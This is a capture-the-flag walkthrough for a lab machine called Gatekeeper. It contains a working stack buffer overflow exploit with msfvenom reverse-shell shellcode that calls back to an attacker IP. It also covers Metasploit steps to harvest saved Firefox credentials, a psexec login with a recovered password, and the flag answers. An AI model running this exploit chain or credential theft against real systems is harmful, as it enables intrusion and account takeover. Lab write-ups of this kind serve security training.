# Gatekeeper
## 21-06-2022
## level : medium

> Machine IP : `10.10.58.163`

## Defeat the gatekeeper and pass through the fire

First Scan the machine using the nmap 
```
nmap -sV 10.10.58.163 nmap.txt
```
We can see that the smb port is open. Now we will try to list the smb shares
```
smbclient -L 10.10.58.163
```

In there we can see that we have a share called Users. Let's connect to it
```
smbclient \\\\10.10.58.163\\Users
```

Now we see that there is several folders and there is a file named `gatekeeper.exe`. Download it and start exploiting it into a lcoal vm

```
get gatekeeper.exe
```

### we will use the immunity debugger, windows 10 vm to exploit this machine.

Create a pattern to exploit 
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
```

Find the offset of the exploit ( Note the value of `ESP` and put as the `-q` parameter value)

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 200 -q 39654138

```

I've used the following code to confirm the overflow (change the `IP`)

```
#!/usr/bin/python

import sys
import socket

buffer = b'A'*146 + b'B'*4

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('10.10.2.7', 31337))
        s.send((buffer + b'\r\n'))
        s.close()
except:
        print("Can't Connect")
finally:
        sys.exit()

```

To Find the badchars I've used the following python script

```
#!/usr/bin/python

import sys
import socket


badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
buffer = b'A'*146 + b'B'*4

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('10.10.2.7', 31337))
        s.send((buffer + badchars + b'\r\n'))
        s.close()
except:
        print("Can't Connect")
finally:
        sys.exit()


```
Using the following module to find the `JMP` hex value
```
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
```
And we Use the `JMP ESP` Command to find out that the JMP code is `FFE4`

Finding the badchars using mona (in immunity debugger in windows)
```
!mona modules
!mona find -s "\xff\xe4" -m gatekeeper.exe
```
Note down the address of the `TOP` value of target


Generating the payload (Change the `IP`)

```
msfvenom -p windows/shell/reverse_tcp LHOST=10.17.48.110 LPORT=4444 EXITFUNC=thread -f python -a x86 -b "\x00\x0A"

```
Now run `msfconsole` and setup `multi/handler` for getting the shell in local machine

Use the following script to exploit the machine and get a shell ( Change the `buf` values and `IP`

```
#!/usr/bin/python

import sys
import socket


buf =  b""
buf += b"\xda\xdd\xd9\x74\x24\xf4\xb8\xdb\x89\x9b\xdf\x5a\x29"
buf += b"\xc9\xb1\x5e\x31\x42\x1a\x03\x42\x1a\x83\xc2\x04\xe2"
buf += b"\x2e\x75\x73\x50\xd0\x86\x84\x0f\xe1\x54\x0d\x2a\x65"
buf += b"\xd2\x5c\x85\xee\xb6\x6c\x6e\xa2\x22\x62\xc7\x08\x6d"
buf += b"\xf7\x55\xa4\x40\xf8\xab\x74\x0e\x3a\xad\x08\x4d\x6f"
buf += b"\x0d\x31\x9e\x62\x4c\x76\x68\x08\xa1\x2a\xe0\xa0\x2d"
buf += b"\x9d\x7d\x06\x72\x20\x52\x0c\xca\x5a\xd7\xd3\xbf\xd6"
buf += b"\xd6\x03\xb4\xae\xc0\xf3\x40\x76\xd1\xf2\x85\x03\xd8"
buf += b"\x81\x15\x3a\x24\x20\xed\x08\x51\xb2\x27\x41\xa5\x19"
buf += b"\x06\x6e\x28\x63\x4e\x48\xd3\x16\xa4\xab\x6e\x21\x7f"
buf += b"\xd6\xb4\xa4\x60\x70\x3e\x1e\x45\x81\x93\xf9\x0e\x8d"
buf += b"\x58\x8d\x49\x91\x5f\x42\xe2\xad\xd4\x65\x25\x24\xae"
buf += b"\x41\xe1\x6d\x74\xeb\xb0\xcb\xdb\x14\xa2\xb3\x84\xb0"
buf += b"\xa8\x51\xd2\xc5\x50\xaa\xdb\x9b\xc6\x67\x16\x24\x17"
buf += b"\xef\x21\x57\x25\xb0\x99\xff\x05\x39\x04\x07\x1f\x2d"
buf += b"\xb7\xd7\xa7\x3d\x49\xd8\xd7\x14\x8e\x8c\x87\x0e\x27"
buf += b"\xad\x43\xce\xc8\x78\xf9\xc4\x5e\x89\xef\xe8\xf0\xe5"
buf += b"\x0d\x08\x1c\xaa\x98\xee\x4e\x02\xcb\xbe\x2e\xf2\xab"
buf += b"\x6e\xc7\x18\x24\x51\xf7\x22\xee\xfa\x92\xcc\x47\x53"
buf += b"\x0b\x74\xc2\x2f\xaa\x79\xd8\x4a\xec\xf2\xe9\xab\xa3"
buf += b"\xf2\x98\xbf\xd4\x64\x63\x3f\x25\x01\x63\x55\x21\x83"
buf += b"\x34\xc1\x2b\xf2\x73\x4e\xd3\xd1\x07\x88\x2b\xa4\x31"
buf += b"\xe3\x1a\x32\x7e\x9b\x62\xd2\x7e\x5b\x35\xb8\x7e\x33"
buf += b"\xe1\x98\x2c\x26\xee\x34\x41\xfb\x7b\xb7\x30\xa8\x2c"
buf += b"\xdf\xbe\x97\x1b\x40\x40\xf2\x1f\x87\xbe\x81\x37\x20"
buf += b"\xd7\x79\x08\xd0\x27\x13\x88\x80\x4f\xe8\xa7\x2f\xa0"
buf += b"\x11\x62\x78\xa8\x98\xe3\xca\x49\x9d\x29\x8a\xd7\x9e"
buf += b"\xde\x17\xe7\xe5\xaf\xa8\x08\x1a\xa6\xcc\x08\x1b\xc6"
buf += b"\xf2\x35\xca\xff\x80\x78\xcf\xbb\x8b\x66\xe5\xb1\x23"
buf += b"\x3f\x6c\x78\x2e\xc0\x5b\xbf\x57\x43\x69\x40\xac\x5b"
buf += b"\x18\x45\xe8\xdb\xf1\x37\x61\x8e\xf5\xe4\x82\x9b"


#080414c3
buffer= b'A'*146 + b'\xc3\x14\x04\x08' + b'\x90'*32 + buf

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('10.10.2.7', 31337))
        s.send((buffer + b'\r\n'))
        s.close()
except:
        print("Can't Connect")
finally:
        sys.exit()


```

### Exploiting the gatekeeper

Just Change the `IP` to `MACHINE_IP` and run the exploit after setting up `multi/handler` with the `VPN_IP` in `msfconsole`

after getting a shell from gatekeeper try to upgrade the generic shell to a meterpreter shell
```
use post/multi/manage/shell_to_meterpreter
```
Set up the options and `exploit`

### Privilege Escalation

We wiill enumerate all the applications installed on the target 
```
run post/windows/gather/enum_applications
```
Now we can see that there `FireFox` is installed. So we will try to collect the saved credentials

```
run post/multi/gather/firefox_creds
```

Now just rename the files with their original names mentioned at the first of each line.

We Will use the `https://github.com/unode/firefox_decrypt.git ` repository to decrypt the credentials (specify the loot folder at the end)

```
python firefox_decrypt.py ~/Desktop/temp/loot
```

Connecting as the mayor
```
python /usr/share/doc/python3-impacket/examples/psexec.py mayor:8CL7O1N78MdrCIsV@10.10.58.163

```

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| Locate and find the user flag | {H4lf_W4y_Th3r3} | 
| Locate and find the root flag | {Th3_M4y0r_C0ngr4tul4t3s_U} |









--------------------------    THE END    -------------------------- 
